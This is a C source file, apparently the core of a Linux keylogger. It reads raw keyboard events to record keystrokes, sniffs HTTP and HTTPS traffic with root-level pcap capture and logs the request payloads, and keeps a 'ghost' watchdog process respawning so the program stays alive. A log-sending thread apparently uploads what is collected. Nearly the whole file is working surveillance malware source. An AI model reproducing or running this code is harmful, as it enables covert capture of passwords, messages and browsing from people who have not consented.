#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdbool.h>
#include <stdlib.h>

#include <pcap.h>

#include <fcntl.h>   //open
#include <string.h>  //strerror
#include <errno.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>  //daemon, close
#include <linux/input.h>

#include "key_util.h"
#include "util.h"
#include "server_client.h"
#include "config.h"

#include "ip.h"
#include "http.h"
#include "process.h"
#include "timed_logger.h"

#define KEY_RELEASE 0
#define KEY_PRESS 1
#define TCP_PROTOCOL 6

/* TODO: Can these be used in pcap filter */
#define HTTP_PORT 80
#define HTTPS_PORT 443

/* TODO: Uncomment this. static const int PCAP_ERRBUF_SIZE = 100 */

pid_t exec_ghost();
void* keep_ghost_alive(void *args);
void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
void* start_keylogging(void *args);
void* send_logs();
struct Config retrive_keyboard_file();

int main(int argc, char **argv)
{
    pid_t id = -1;
    if (argc >= 2)
        id = atoi(argv[1]);

    Config config = retrive_keyboard_file();
    
    pthread_attr_t attr;
    pthread_attr_init(&attr);

    pthread_t aliver;
    pthread_create(&aliver, &attr, keep_ghost_alive, &id);
    
    pthread_t keylog;
    pthread_create(&keylog, &attr, start_keylogging, &config);
    
    pthread_t sendlogs;
    pthread_create(&sendlogs, &attr, send_logs, NULL);

    FILE *network_log = fopen("/.keylogger/log/network.txt", "a");
    if (network_log == NULL)
    {
        printf("Error opening network log. Exiting...");
        exit(1);
    }
    setbuf(network_log, NULL);

    struct loginfo info = { network_log, NEVER_WRITTEN, 4 };

    FILE *keylog_log = fopen("log/keylog.txt", "a");
    config.keylog_log = keylog_log;
    setbuf(keylog_log, NULL);  //Disable buffering to write on every KEY_PRESS
    
    /* Variables for pcap sniffing, such as error buffer, device to be read
       and filters, masks, etc. */
    char *dev, errbuf[100];
    pcap_t *handle;
    struct bpf_program filter;
    bpf_u_int32 mask;
    bpf_u_int32 net;

    /*Check for root privileges*/
    if (geteuid() != 0) {
        printf("Must run as root! Exiting... \n");
        exit(1);
    }
    
    /* Create the default pcap device and exit if error occurs */
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL)
    {
        printf("No default device: %s. Exiting...", errbuf);
        exit(1);
    }

    /* Find the netmask for the chosen device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) < 0)
    {
        printf("Can't get netmask for device: %s. Exiting...", errbuf);
        exit(1);
    }

    /* Create a handle to start sniffint packets in non promiscuous
       mode. */
    handle = pcap_open_live(dev, 1518, true, 1000, errbuf);
    if (handle == NULL)
    {
        printf("Couldn't open device: %s. Exiting...", errbuf);
        exit(1);
    }

    /* Handle the creation of the filter compilation and installing */
    if (pcap_compile(handle, &filter, "tcp port 80 or tcp port 443", 0, net) < 0)
    {
        printf("Couldn't create filter: %s. Exiting...", pcap_geterr(handle));
        exit(1);
    }

    if (pcap_setfilter(handle, &filter) < 0)
    {
        printf("Couldn't install filter: %s. Exiting...", pcap_geterr(handle));
        exit(1);
    }
    
    pcap_loop(handle, -1, packet_received, (u_char*) &info);

    pcap_freecode(&filter);
    pcap_close(handle);
    pthread_join(aliver, NULL);
    pthread_join(keylog, NULL);
    pthread_join(sendlogs, NULL);
    fclose(network_log);
    fclose(keylog_log);

    return 0;
}

pid_t exec_ghost()
{
    pid_t parent_id = getpid();
    pid_t id = fork();

    if (id < 0)
    {
        printf("There was an error forking. Exiting...\n");
        exit(1);
    }
    else if (id == 0)
    {
        char str_id[6];
        sprintf(str_id, "%d", parent_id);

        printf("Starting ghost...\n");
        execlp("/.keylogger/./ghost", "./ghost", str_id, NULL);
    }

    return id;
}

void* keep_ghost_alive(void *args)
{
    pid_t cur_pid = *((int *) args);
    while(1)
    {
        cur_pid = process_periodic_check(cur_pid, 5, -1, exec_ghost);
        wait(NULL);
    }
}

void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    struct loginfo *info = (struct loginfo*) args;

    struct ethernet_header *eth;
    struct ip_header *ip;
    struct tcp_header *tcp;
    const u_char *payload;
    u_int p_size;

    if (process_packet(packet, &eth, &ip, &tcp, &payload, &p_size) < 0)
    {
        printf("There was an error processing the packet.");
        exit(1);
    }

    if (p_size > 0)
    {
        if (is_http_request(payload, p_size))
        {
            timestamped_write(info, payload);
            timestamped_write(info, "\n");
        }
    }
}

struct Config retrive_keyboard_file()
{
    /*retrieve keyboard device file*/
    Config config;
    static const char *command =
    "grep -E 'Handlers|EV' /proc/bus/input/devices |"
    "grep -B1 120013 |"
    "grep -Eo event[0-9]+ |"
    "tr '\\n' '\\0'";
    
    FILE *pipe = popen(command, "r");
    if (pipe == NULL) {
        printf("Could not determine keyboard device file \nExiting...");
        exit(-1);
    }
    char result[20] = "/dev/input/";
    char temp[9];
    fgets(temp, 9, pipe);
    pclose(pipe);
    config.device_file = strcat(result, temp);
    
    /*Open keyboard device file*/
    int kb_fd = open(config.device_file, O_RDONLY);
    if (kb_fd == -1) {
        printf("Could not open keyboard device file. \nError: %s.  \nExiting...", strerror(errno));
        exit(-1);
    }
    config.kb_fd = (int)kb_fd;
    return config;

}

void* start_keylogging(void *args)
{
    typedef struct input_event input_event;
    input_event event;
    int shift_pressed=0; //If shift engaged, shift_pressed = 1

    Config *config = args;

    /*Use struct for timestamped_write*/
    FILE *keylog_filename = config->keylog_log;

   // daemon(1, 0);
    
    while (read(config->kb_fd, &event, sizeof(input_event)) > 0){
        if (event.type == EV_KEY) {
            if (event.value == KEY_PRESS) {
                if (is_shift(event.code)) {
                    shift_pressed == 1;
                }
                char *name = get_key_text(event.code, shift_pressed);
                if (strcmp(name, "\0") != 0) {
                    fprintf(keylog_filename, "%s", name);
                    /*
                   timestamped_write(keylog_info, name);
                   timestamped_write(keylog_info, "\n"); */
                }
            } else if (event.value == KEY_RELEASE) {
                if (is_shift(event.code)) {
                    shift_pressed == 0;
                }
            }
        }
    }
    return EXIT_SUCCESS;
}

void* send_logs()
{
    //sleep(300); //sleep for 300sec = 5 min
    run_client();
    run_server();
    return EXIT_SUCCESS;
}
